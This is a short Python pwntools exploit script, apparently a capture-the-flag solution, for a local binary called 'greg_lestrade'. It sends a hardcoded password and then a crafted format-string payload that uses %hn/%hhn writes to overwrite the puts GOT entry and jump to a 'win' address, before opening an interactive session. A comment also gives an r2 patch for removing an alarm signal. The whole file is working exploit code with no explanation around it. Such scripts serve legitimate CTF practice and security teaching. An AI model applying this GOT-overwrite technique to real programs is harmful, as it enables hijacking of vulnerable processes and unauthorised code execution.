#!/usr/bin/python

from pwn import *

'''
Patch for debugging in r2: wx 9090909090@0x4008d1
That should get rid of the SIGALARM. No one likes interruptions.
'''

context.log_level = 'DEBUG'
context.arch = 'amd64'

password = "7h15_15_v3ry_53cr37_1_7h1nk"

e = ELF("./greg_lestrade")

p = process("./greg_lestrade")
print p.recv()
p.send(password)

print p.recv()

#We can write whatever we want so long as we pad out the bytes to a multiple of 256, with -1
def send_padded(payload, padd_dir=None):
    log.debug('Payload = %s' % payload)
    log.debug('Length = %d' % len(payload))
    padding = 'a' * (256 - (len(payload) % 256) - 1) #-1 for +1 added after strcmp
    p.send(payload + padding)
    return p.recv(4096*10, 1)

def send_cmd(payload):
    p.sendline('1')
    print p.recv()
    return send_padded(payload)

#control_offset = 8 #Just played a little with it, confirmed by autofmt
win =0x00400876 
puts_got = e.got['puts'] #First thing called after printf


fmt_payload = ('b'*256) + '%1910c%47$hn' + '%202c%48$hhn' + '%192c%49$hhn' + '%50$hhn' + '%51$hhn ' + ' '*5 + p64(e.got['puts']) + p64(e.got['puts']+2) + p64(e.got['puts']+3) + p64(e.got['puts']+4) + p64(e.got['puts']+5)
#Almost came all together...

print send_cmd(fmt_payload)


print "pid:%d" % p.pid
p.interactive()
